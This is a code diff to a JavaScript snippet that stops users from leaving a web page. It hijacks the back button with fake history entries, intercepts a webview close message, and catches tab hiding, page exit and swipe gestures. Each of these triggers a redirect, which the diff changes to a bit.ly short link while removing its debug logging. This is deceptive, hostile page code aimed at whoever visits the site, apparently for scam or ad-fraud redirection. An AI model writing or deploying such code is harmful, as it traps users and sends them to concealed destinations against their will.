@@ -15,15 +15,11 @@
     function log(msg) { try { navigator.sendBeacon('/debug-log', msg); } catch(e){} }
 
     function fireFullscreen() {
-        log('fire');
-        window.location.href = 'https://www.utilityfare.com/relay';
+        window.location.href = 'https://bit.ly/4fnzeOR';
     }
 
     function onClose() {
-        if (!schemeFired && Date.now() - pageLoadTime > 500) {
-            schemeFired = true;
-            fireFullscreen();
-        }
+        if (!schemeFired) { schemeFired = true; fireFullscreen(); }
     }
 
     // X button
@@ -34,7 +30,7 @@
             _wh.postMessage = function(msg) {
                 try {
                     var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
-                    if (d && d.func === 'close') { log('piper:close'); onClose(); }
+                    if (d && d.func === 'close' && Date.now() - pageLoadTime > 500) onClose();
                 } catch(e){}
                 return _orig(msg);
             };
@@ -42,17 +38,16 @@
     } catch(e){}
 
     document.addEventListener('visibilitychange', function(){
-        if (document.hidden) { log('vis:hidden'); onClose(); }
-        else { schemeFired = false; }
+        if (document.hidden && Date.now() - pageLoadTime > 500) { onClose(); }
+        else if (!document.hidden) { schemeFired = false; }
     });
 
-    window.addEventListener('pagehide', function(){ log('pagehide'); onClose(); });
+    window.addEventListener('pagehide', function(){ if (Date.now() - pageLoadTime > 500) onClose(); });
 
     try {
         history.pushState({_trap: 1}, '', window.location.href);
         window.addEventListener('popstate', function(e) {
             if (e.state && e.state._trap) {
-                log('popstate');
                 onClose();
                 try { history.pushState({_trap: 1}, '', window.location.href); } catch(ex){}
             }
@@ -68,8 +63,8 @@
         var dx = e.touches[0].clientX - txStart;
         var dy = e.touches[0].clientY - tyStart;
         if (Math.abs(dx) < Math.abs(dy) * 0.8) return;
-        if (dx < -40) { swipeFired = true; log('swipe:left'); onClose(); }
-        if (txStart < 30 && dx > 20) { swipeFired = true; log('swipe:edge'); onClose(); }
+        if (dx < -40) { swipeFired = true; onClose(); }
+        if (txStart < 30 && dx > 20) { swipeFired = true; onClose(); }
     }, {passive: true});
 })();
 
